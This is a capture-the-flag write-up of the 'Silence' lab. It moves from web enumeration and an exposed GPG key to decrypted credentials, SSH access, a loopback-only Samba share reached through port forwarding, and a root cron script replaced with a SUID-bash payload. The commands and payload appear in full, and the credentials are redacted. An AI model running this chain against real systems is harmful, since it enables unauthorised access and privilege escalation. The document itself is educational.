---
type: writeup
platform: Exegol
room: Silence
os: Linux
environment: Web Application / Linux Privilege Escalation

techniques:
  - web-enumeration
  - directory-listing
  - sensitive-file-disclosure
  - private-key-disclosure
  - gpg-decryption
  - credential-discovery
  - ssh-access
  - local-service-enumeration
  - ssh-port-forwarding
  - anonymous-smb-access
  - writable-smb-share
  - cron-abuse
  - suid-abuse

tools:
  - nmap
  - curl
  - gobuster
  - unzip
  - gpg
  - hydra
  - ssh
  - smbclient
  - testparm
---
**Attack path:** Web enumeration → exposed archive and GPG private key → decrypted XLSX credentials → SSH as `janja` → local Samba discovery → writable `adam` home share → root-executed cron script replacement → SUID Bash → root

## 1. Reconnaissance

A full TCP scan was performed:

```bash
nmap -p- -T4 <TARGET_IP>
```

Only two ports were exposed:

```bash
22/tcp open  ssh
80/tcp open  http
```

Service enumeration provided additional details:

```bash
nmap -sV -sC -p22,80 <TARGET_IP>
```

Relevant results:

```bash
22/tcp open  ssh   OpenSSH 10.0p2 Debian
80/tcp open  http  Apache/2.4.68 (Debian)
```

The HTTP title was:

```bash
Adam Ondra
```

With no credentials available yet, the web service became the initial attack surface.

---

## 2. Web Enumeration

The home page was inspected:

```bash
curl -i http://<TARGET_IP>/
```

Its HTML contained:

```html
<!-- Silence is golden -->
```

Content discovery was then performed:

```bash
gobuster dir \
  -u http://<TARGET_IP> \
  -w ~/work/Pentest/Wordlist/SecLists/Discovery/Web-Content/common.txt \
  -x php,txt,html,bak,old,zip
```

A hidden directory was discovered:

```bash
/hidden/    Status: 301
```

Requesting it showed that directory listing was enabled:

```bash
curl -i http://<TARGET_IP>/hidden/
```

The directory exposed:

```bash
stats.zip
```

---

## 3. Sensitive Archive Disclosure

The archive was downloaded:

```bash
curl -O http://<TARGET_IP>/hidden/stats.zip
```

Its contents were listed before further analysis:

```bash
unzip -l stats.zip
```

Relevant files:

```bash
ClimbersStats.xlsx.gpg
.hidden-key
```

The combination of an encrypted document and a hidden key file immediately warranted closer inspection.

After extraction, their formats were identified:

```bash
file silence_stats/.hidden-key \
     silence_stats/ClimbersStats.xlsx.gpg
```

Results:

```bash
.hidden-key:            PGP private key block
ClimbersStats.xlsx.gpg: PGP message Public-Key Encrypted Session Key
```

The archive therefore exposed both:

```text
encrypted sensitive data
+
the private key capable of decrypting it
```

The encryption no longer provided meaningful confidentiality.

---

## 4. Importing the Exposed GPG Private Key

A dedicated GPG home directory was created to avoid modifying the attacker's normal keyring:

```bash
mkdir -m 700 gnupg
```

The exposed private key was imported:

```bash
GNUPGHOME="$PWD/gnupg" \
  gpg --import silence_stats/.hidden-key
```

The key belonged to:

```bash
Adam Ondra <adam@climbing.thm>
```

The private key itself is intentionally not reproduced in this public write-up.

With the corresponding secret key available, the encrypted spreadsheet could now be decrypted.

---

## 5. Decrypting the Spreadsheet

The GPG-protected XLSX file was decrypted with:

```bash
GNUPGHOME="$PWD/gnupg" \
  gpg \
  --output ClimbersStats.xlsx \
  --decrypt silence_stats/ClimbersStats.xlsx.gpg
```

This produced:

```bash
ClimbersStats.xlsx
```

An XLSX document is a ZIP-based collection of XML files, so its shared strings were inspected directly:

```bash
unzip -p ClimbersStats.xlsx xl/sharedStrings.xml \
  | sed 's/<[^>]*>/\n/g' \
  | sed '/^[[:space:]]*$/d'
```

The spreadsheet contained several username/password pairs.

Public version:

```bash
adam   : <REDACTED>
magnus : <REDACTED>
janja  : <REDACTED>
```

At this point, these were discovered credentials only. They still needed to be validated against an exposed service.

---

## 6. SSH Credential Validation

The recovered username/password pairs were placed into a Hydra credential file:

```bash
printf '%s\n' \
  'adam:<REDACTED>' \
  'magnus:<REDACTED>' \
  'janja:<REDACTED>' \
  > creds.txt
```

The exact pairs were tested against SSH:

```bash
hydra -C creds.txt -f ssh://<TARGET_IP>
```

A valid pair was identified:

```bash
Username: janja
Password: <REDACTED>
```

This confirmed that one of the credentials stored in the exposed spreadsheet was valid for operating-system access.

---

## 7. SSH Access as `janja`

The target was accessed through SSH:

```bash
ssh janja@<TARGET_IP>
```

The new identity was verified:

```bash
whoami
pwd
```

Result:

```bash
janja
/home/janja
```

The user's home directory contained:

```bash
/home/janja/user.txt
```

The flag was read:

```bash
cat ~/user.txt
```

```bash
EPI{REDACTED}
```

The attack had now progressed from unauthenticated web access to an interactive local shell as `janja`.

---

## 8. Initial Privilege-Escalation Enumeration

Sudo privileges were checked first:

```bash
sudo -l
```

Result:

```bash
Sorry, user janja may not run sudo on climbing.
```

SUID binaries were enumerated:

```bash
find / -perm -4000 -type f 2>/dev/null
```

Relevant results were standard system binaries:

```bash
/usr/bin/mount
/usr/bin/passwd
/usr/bin/umount
/usr/bin/su
/usr/bin/sudo
/usr/sbin/exim4
```

Linux capabilities were also checked:

```bash
getcap -r / 2>/dev/null
```

No useful capability-based escalation path was identified.

Attention therefore moved to scheduled privileged execution.

---

## 9. Root Cron Job

System cron configuration was inspected:

```bash
cat /etc/crontab
ls -la /etc/cron.d/
```

A custom entry was discovered:

```bash
/etc/cron.d/adam
```

Its contents were:

```bash
* * * * * root /home/adam/checklist.sh
```

This established an important privilege boundary:

```text
/root context/
        ↓
executes every minute
        ↓
/home/adam/checklist.sh
```

If `janja` could influence that script, it would become a root code-execution primitive.

Direct access was tested:

```bash
ls -l /home/adam/checklist.sh
cat /home/adam/checklist.sh
```

but failed with:

```bash
Permission denied
```

Path permissions explained why:

```bash
namei -l /home/adam/checklist.sh
```

Relevant result:

```bash
drwx------ adam adam adam
                    checklist.sh - Permission denied
```

`janja` could not traverse `/home/adam`, so the cron script was not directly reachable through the filesystem.

---

## 10. Local Service Discovery

Running processes confirmed that the cron job was actively executing:

```bash
ps -eo user,pid,ppid,cmd --forest
```

Relevant processes included:

```bash
root ... /usr/sbin/CRON
root ... /bin/sh -c /home/adam/checklist.sh
root ... /bin/sh /home/adam/checklist.sh
root ... sleep 10
```

This was runtime confirmation that the script identified in `/etc/cron.d/adam` was actually executed as root.

Listening services were then enumerated:

```bash
ss -lntup
```

An unexpected local-only service appeared:

```bash
127.0.0.1:445
```

TCP/445 suggested SMB/Samba, but it was bound only to loopback and therefore not visible during the original remote scan.

---

## 11. Samba Configuration

The Samba configuration was inspected:

```bash
grep -vE '^[[:space:]]*(#|;|$)' /etc/samba/smb.conf
```

Relevant configuration:

```ini
[global]
   workgroup = WORKGROUP
   server role = standalone server
   bind interfaces only = yes
   interfaces = lo
   smb ports = 445

[Adam home dir]
   path = /home/adam
   read only = no
   force user = adam
   guest ok = yes
   writable = yes
   browseable = yes
```

The effective configuration was also verified with:

```bash
testparm -s 2>/dev/null
```

The share combined several dangerous properties:

```text
path = /home/adam
guest ok = yes
writable = yes
force user = adam
```

This meant an anonymous SMB client could interact with `/home/adam` through Samba, while filesystem operations were performed as `adam`.

The share therefore provided an alternate access path around the directory traversal restriction encountered by `janja`.

The remaining obstacle was that Samba listened only on the target's loopback interface.

---

## 12. SSH Port Forwarding to Local Samba

An SSH local forward was created from the attacker machine:

```bash
ssh -fN \
  -L 1445:127.0.0.1:445 \
  janja@<TARGET_IP>
```

This mapped:

```text
attacker 127.0.0.1:1445
        ↓ SSH tunnel
target 127.0.0.1:445
```

The internal Samba service was now reachable locally through:

```bash
127.0.0.1:1445
```

This demonstrates why post-compromise service enumeration matters: services unavailable from the external network may become reachable after obtaining a foothold.

---

## 13. Anonymous Access to Adam's Home Directory

The forwarded SMB service was accessed without credentials:

```bash
smbclient \
  "//127.0.0.1/Adam home dir" \
  -p 1445 \
  -N
```

Authentication succeeded:

```bash
Anonymous login successful
```

Listing the share revealed:

```bash
.bashrc
.profile
.bash_logout
checklist.sh
```

The same script that was inaccessible directly from the `janja` shell was now reachable through Samba.

It was downloaded for inspection:

```bash
get checklist.sh
```

---

## 14. Analysing the Root-Executed Script

The script contained:

```bash
echo "Checking if all the supplies are ready for the hike..."
ls -alh /home/adam
sleep 10
echo "Testing superhuman grip strength with one finger pull-ups"
finger 2> /dev/null
sleep 10
echo "Verifying that no one can execute this checklist"
chmod 766 /home/adam/checklist.sh
sleep 10
echo "OK, this should be fine, let's go to Flathanger!"
```

Two independently observed facts could now be connected:

```text
Samba permits anonymous writes to /home/adam as adam
        +
root executes /home/adam/checklist.sh every minute
        =
attacker-controlled script executed as root
```

The writable share was therefore not merely an information-disclosure issue. It exposed a file trusted and executed by a privileged scheduled task.

---

## 15. Replacing the Cron Script

The original script was backed up locally:

```bash
cp checklist.sh checklist.sh.original
```

A replacement payload was created:

```bash
#!/bin/sh
cp /bin/bash /tmp/rootbash
chmod 4755 /tmp/rootbash
```

The payload creates a root-owned copy of Bash and sets its SUID bit when executed by root.

The modified script was uploaded through the writable Samba share:

```bash
smbclient \
  "//127.0.0.1/Adam home dir" \
  -p 1445 \
  -N
```

Inside `smbclient`:

```bash
put checklist.sh
exit
```

At the next scheduled execution, root ran the attacker-controlled version.

---

## 16. Confirming Root Execution

The resulting Bash copy was inspected:

```bash
ls -l /tmp/rootbash
```

Result:

```bash
-rwsr-xr-x 1 root root ... /tmp/rootbash
```

The evidence confirmed both required conditions:

```text
owner = root
SUID  = set
```

The cron script had therefore executed successfully with root privileges.

---

## 17. Root Shell

The privileged Bash copy was started with:

```bash
/tmp/rootbash -p
```

The `-p` option preserved the SUID-derived effective identity.

Privileges were verified:

```bash
id
```

Result:

```bash
uid=1002(janja) gid=1002(janja) euid=0(root) groups=1002(janja)
```

The real user remained `janja`, but:

```bash
euid=0(root)
```

confirmed that commands executed with root privileges.

The final flag was then read:

```bash
cat /root/root.txt
```

```bash
EPI{REDACTED}
```

---

## Key Takeaways

- Directory listing can turn a supposedly hidden web location into direct sensitive-file disclosure.
- Encryption does not protect data when the corresponding private decryption key is exposed alongside the ciphertext.
- Credentials extracted from files should be treated as hypotheses until they are validated against an actual authentication service.
- External port scanning does not reveal services bound exclusively to loopback; local enumeration after initial access can expose a second attack surface.
- SSH port forwarding can make a target-local service reachable without changing that service's listening configuration.
- Filesystem permissions and service-mediated access are separate security boundaries: `janja` could not traverse `/home/adam`, but Samba accessed the same directory as `adam`.
- A writable share becomes significantly more dangerous when it contains a file executed by a more privileged context.
- A writable file alone is not enough for privilege escalation; the decisive evidence was that root periodically executed the attacker-controlled `checklist.sh`.
- `euid=0(root)` confirmed privileged execution through the SUID Bash copy even though the real UID remained `janja`.